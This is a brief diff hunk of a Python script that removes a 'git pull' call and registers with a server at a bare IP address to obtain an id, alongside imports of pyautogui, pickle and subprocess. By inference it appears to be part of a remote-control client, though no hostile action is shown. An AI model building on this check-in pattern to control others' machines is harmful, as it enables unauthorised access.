@@ -6,7 +6,6 @@ import pickle
 from subprocess import run
 import pyautogui
 
-run("git pull")
 host = "http://72.205.82.44:8008"
 req = requests.get(host+"/register")
 id = req.json()['id']
